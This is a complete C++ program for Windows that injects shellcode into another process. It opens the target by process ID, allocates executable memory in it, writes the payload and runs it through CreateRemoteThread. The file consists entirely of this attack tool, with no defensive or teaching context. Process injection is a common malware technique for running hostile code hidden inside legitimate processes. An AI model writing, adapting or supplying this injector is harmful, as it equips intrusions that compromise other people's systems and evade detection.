#include <iostream>
#include <windows.h>

// Process injection using CreateRemoteThread.
// Injects shellcode into a remote process.

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cout << "Usage: " << argv[0] << " <PID> <Shellcode>" << std::endl;
        return 1;
    }

    DWORD pid = atoi(argv[1]);
    unsigned char* shellcode = (unsigned char*)argv[2];
    SIZE_T shellcodeSize = strlen((char*)shellcode);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "Failed to open process." << std::endl;
        return 1;
    }

    LPVOID pRemoteBuffer = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteBuffer == NULL) {
        std::cerr << "Failed to allocate memory in remote process." << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteBuffer, shellcode, shellcodeSize, NULL)) {
        std::cerr << "Failed to write to remote process memory." << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "Failed to create remote thread." << std::endl;
        VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Injection successful." << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
